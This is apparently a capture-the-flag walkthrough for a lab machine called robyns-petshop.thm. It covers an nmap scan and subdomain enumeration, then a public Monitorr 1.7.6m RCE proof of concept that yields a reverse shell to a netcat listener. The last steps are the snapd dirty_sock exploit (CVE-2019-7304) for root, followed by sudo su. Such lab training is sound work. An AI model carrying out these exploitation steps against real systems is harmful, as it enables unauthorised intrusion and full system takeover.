## MACHINE IP
```bash
18.206.15.196
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Thu Oct 16 15:13:28 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 18.206.15.196
Increasing send delay for 18.206.15.196 from 0 to 5 due to 11 out of 16 dropped probes since last increase.
Nmap scan report for ec2-18-206-15-196.compute-1.amazonaws.com (18.206.15.196)
Host is up (0.22s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
21/tcp    open  tcpwrapped
22/tcp    open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  tcpwrapped
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp   open  tcpwrapped
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-16T09:40:44
| Not valid after:  2026-10-16T09:40:44
| MD5:   99ab:13ef:0491:0be8:15b6:126a:47a6:85fc
|_SHA-1: 1b39:47f7:c8e8:3755:f943:990b:db74:b34d:30ff:edf7
|_http-server-header: Apache/2.4.29 (Ubuntu)
22222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 16 15:17:11 2025 -- 1 IP address (1 host up) scanned in 223.48 seconds
```
## OPEN PORTS - ANALYSIS
```bash
21/tcp    open  tcpwrapped
22/tcp    open  tcpwrapped
80/tcp    open  tcpwrapped
443/tcp   open  tcpwrapped
22222/tcp open  tcpwrapped
```
## RECON
```bash
# Operating System                   // Found Post Initial foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
NAME="Ubuntu"
VERSION="18.04.5 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.5 LTS"
VERSION_ID="18.04"
```
## ENUMERATION
```bash
# Port 21
sudo ftp $ip 
Connected to 3.239.43.86.
220 (vsFTPd 3.0.3)
Name (3.239.43.86:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.

# Port 80 443
- Access IP redirects to https://robyns-petshop.thm/
- Checking Certificate 
	  - Common Name robyns-petshop.thm
	  - Email Address robyn@robyns-petshop.thm
	  - DNS Name dev.robyns-petshop.thm beta.robyns-petshop.thm monitorr.robyns-petshop.thm  
- Add to /etc/hosts file 
 
- From source code able to find 
  - Uses Pico CMS
- From  view-source:https://dev.robyns-petshop.thm/themes/default/js/pico.js
  - Version 2.1
 
# Port 8096
- Found login page http://robyns-petshop.thm:8096/web/index.html#!/login.html?serverid=b6c698509b83439992b3e437c87f7fb5
- Jellyfin
  
# Port 80 - subdomain
- Access url - https://monitorr.robyns-petshop.thm
- Found Monitorr 1.7.6m  
- Found exploits for  Monitorr 1.7.6m  
- https://www.exploit-db.com/exploits/48980
- Exploit POC (Found Using google Fu) - https://raw.githubusercontent.com/jayngng/monitorr-v1.7.6m-rce/refs/heads/main/monitorr.py
```
## INITIAL SHELL
```bash
python3 monitorr.py
[*] Example usage: 
        > url: https://monitorr.robyns-petshop.thm
        > local ip: 57.123.456.789
        > local port: 443
-------------------------
> url (include schema): https://monitorr.robyns-petshop.thm
> local ip: 10.13.80.25
> local port: 80
3^[[[+] Successfully upload payload
[+] Triggering reverse shell
[*] Should've got rev shell

sudo nc -nvlp 80                                                                                                                            
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.84.195] 43688
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ whoami
whoami
www-data
```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh 
- Found
-rwsr-sr-x 1 root root 99K Apr 16  2018 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

searchsploit snap 
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)| linux/local/46362.py

- Transfer 46362.py and execute 
python3  46362.py

- It created user dirty_sock with creds dirty_sock 
```
## ROOT | ADMINISTRATOR - PWNED
```bash
su dirty_sock
Password: dirty_sock

dirty_sock@petshop:/tmp$ sudo -l
[sudo] password for dirty_sock: 
Matching Defaults entries for dirty_sock on petshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Runas and Command-specific defaults for dirty_sock:
    Defaults!/sbin/service jellyfin restart, /usr/sbin/service jellyfin restart !requiretty
    Defaults!/sbin/service jellyfin start, /usr/sbin/service jellyfin start !requiretty
    Defaults!/sbin/service jellyfin stop, /usr/sbin/service jellyfin stop !requiretty
    Defaults!/usr/bin/systemctl restart jellyfin, /bin/systemctl restart jellyfin !requiretty
    Defaults!/usr/bin/systemctl start jellyfin, /bin/systemctl start jellyfin !requiretty
    Defaults!/usr/bin/systemctl stop jellyfin, /bin/systemctl stop jellyfin !requiretty
    Defaults!/etc/init.d/jellyfin restart !requiretty
    Defaults!/etc/init.d/jellyfin start !requiretty
    Defaults!/etc/init.d/jellyfin stop !requiretty

User dirty_sock may run the following commands on petshop:
    (ALL : ALL) ALL
    (ALL : ALL) ALL
dirty_sock@petshop:/tmp$ sudo su
root@petshop:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@petshop:/tmp# whoami
root
```
